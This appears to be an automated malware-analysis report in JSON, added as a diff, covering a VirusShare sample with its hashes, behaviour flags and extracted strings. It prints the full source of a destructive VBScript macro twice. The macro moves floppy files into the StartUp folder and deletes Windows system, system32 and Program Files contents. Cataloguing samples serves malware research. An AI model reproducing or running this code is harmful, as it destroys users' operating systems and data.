@@ -1,0 +1,78 @@
+{
+    "docinfo": {
+        "attributes": [],
+        "behavior": {
+            "CreateObject": "May create an OLE object",
+            "WINDOWS": "May enumerate application windows",
+            "system": "May run an executable file or a system command on a Mac"
+        },
+        "macro": "Print \"WARNING: This virus will destroy your system\"\nPrint \"ha ha ha ha\"\nPrint \"Name of the virus:A7meedye\"\nPrint \"made by Ahmedo\"\nDim filesys, newfolder, newfolderpath\nnewfolderpath = \"c:\\WINDOWS\\Folder\"\nSet filesys = CreateObject(\"Scripting.FileSystemObject\")\nIf Not filesys.FolderExists(newfolderpath) Then\nSet newfolder = filesys.CreateFolder(newfolderpath)\nEnd If\n\n'Moving a file system - the if FileExists does not work'\nDim filemove\nSet filemove = CreateObject(\"Scripting.FileSystemObject\")\nfilemove.MoveFile \"a:\\*.*\", \"C:\\WINDOWS\\Start Menu\\Programs\\StartUp\"\n\nDim filemove\nSet filemove = CreateObject(\"Scripting.FileSystemObject\")\nfilemove.MoveFile \"c:\\windows\\system\\*.*\", \"c:\\WINDOWS\\Folder\\\"\n\n'Deleting a file - you don't have to use FileExists'\n\nDim filedel\nSet filedel = CreateObject(\"Scripting.FileSystemObject\")\nfiledel.DeleteFile \"c:\\windows\\system\\*.*\"\n\nDim filedel\nSet filedel = CreateObject(\"Scripting.FileSystemObject\")\nfiledel.DeleteFile \"c:\\Program Files\\*.*\"\n\n'Deleting a file - you don't have to use FileExists'\n\nDim filedelwsc\nSet filedelwsc = CreateObject(\"Scripting.FileSystemObject\")\nfiledelwsc.DeleteFile \"c:\\windows\\system32\\*.wsc\"\n\nDim filedeldrv\nSet filedeldrv = CreateObject(\"Scripting.FileSystemObject\")\nfiledeldrv.DeleteFile \"c:\\windows\\system32\\*.drv\"\n\nDim filedelvbs\nSet filedelvbs = CreateObject(\"Scripting.FileSystemObject\")\nfiledelvbs.DeleteFile \"c:\\windows\\system32\\*.vbs\"\n\nDim filedelsys\nSet filedelsys = CreateObject(\"Scripting.FileSystemObject\")\nfiledelsys.DeleteFile \"c:\\windows\\system32\\*.sys\"\n\nDim filedelnls\nSet filedelnls = CreateObject(\"Scripting.FileSystemObject\")\nfiledelnls.DeleteFile \"c:\\windows\\system32\\*.nls\"\n\nDim filedelexe\nSet filedelexe = CreateObject(\"Scripting.FileSystemObject\")\nfiledelexe.DeleteFile \"c:\\windows\\system32\\*.exe\""
+    },
+    "filename": "VirusShare_bd8ca668e760c4fea22857de30b6e408",
+    "filesize": 1847,
+    "filetype": "ASCII text, with CRLF line terminators",
+    "hashes": {
+        "md5": "bd8ca668e760c4fea22857de30b6e408",
+        "sha1": "0c0c0ade0d7afd823e9a47b505b7e5323df567b2",
+        "sha256": "6b73475e052c57b721467fea8bb1af3a7613403b8d8417088bb30b933d2626a4"
+    },
+    "peinfo": {},
+    "strings": {
+        "dump": [
+            "Print \"WARNING: This virus will destroy your system\"",
+            "Print \"ha ha ha ha\"",
+            "Print \"Name of the virus:A7meedye\"",
+            "Print \"made by Ahmedo\"",
+            "Dim filesys, newfolder, newfolderpath",
+            "newfolderpath = \"c:\\WINDOWS\\Folder\"",
+            "Set filesys = CreateObject(\"Scripting.FileSystemObject\")",
+            "If Not filesys.FolderExists(newfolderpath) Then",
+            "Set newfolder = filesys.CreateFolder(newfolderpath)",
+            "End If",
+            "'Moving a file system - the if FileExists does not work'",
+            "Dim filemove",
+            "Set filemove = CreateObject(\"Scripting.FileSystemObject\")",
+            "filemove.MoveFile \"a:\\*.*\", \"C:\\WINDOWS\\Start Menu\\Programs\\StartUp\"",
+            "Dim filemove",
+            "Set filemove = CreateObject(\"Scripting.FileSystemObject\")",
+            "filemove.MoveFile \"c:\\windows\\system\\*.*\", \"c:\\WINDOWS\\Folder\\\"",
+            "'Deleting a file - you don't have to use FileExists'",
+            "Dim filedel",
+            "Set filedel = CreateObject(\"Scripting.FileSystemObject\")",
+            "filedel.DeleteFile \"c:\\windows\\system\\*.*\"",
+            "Dim filedel",
+            "Set filedel = CreateObject(\"Scripting.FileSystemObject\")",
+            "filedel.DeleteFile \"c:\\Program Files\\*.*\"",
+            "'Deleting a file - you don't have to use FileExists'",
+            "Dim filedelwsc",
+            "Set filedelwsc = CreateObject(\"Scripting.FileSystemObject\")",
+            "filedelwsc.DeleteFile \"c:\\windows\\system32\\*.wsc\"",
+            "Dim filedeldrv",
+            "Set filedeldrv = CreateObject(\"Scripting.FileSystemObject\")",
+            "filedeldrv.DeleteFile \"c:\\windows\\system32\\*.drv\"",
+            "Dim filedelvbs",
+            "Set filedelvbs = CreateObject(\"Scripting.FileSystemObject\")",
+            "filedelvbs.DeleteFile \"c:\\windows\\system32\\*.vbs\"",
+            "Dim filedelsys",
+            "Set filedelsys = CreateObject(\"Scripting.FileSystemObject\")",
+            "filedelsys.DeleteFile \"c:\\windows\\system32\\*.sys\"",
+            "Dim filedelnls",
+            "Set filedelnls = CreateObject(\"Scripting.FileSystemObject\")",
+            "filedelnls.DeleteFile \"c:\\windows\\system32\\*.nls\"",
+            "Dim filedelexe",
+            "Set filedelexe = CreateObject(\"Scripting.FileSystemObject\")",
+            "filedelexe.DeleteFile \"c:\\windows\\system32\\*.exe\""
+        ],
+        "file": {},
+        "fuzzing": {},
+        "ip": [],
+        "url": []
+    },
+    "time": "0:00:00.278876",
+    "version": "6.0.3",
+    "virustotal": {
+        "positives": "",
+        "total": ""
+    },
+    "yara_plugins": []
+}
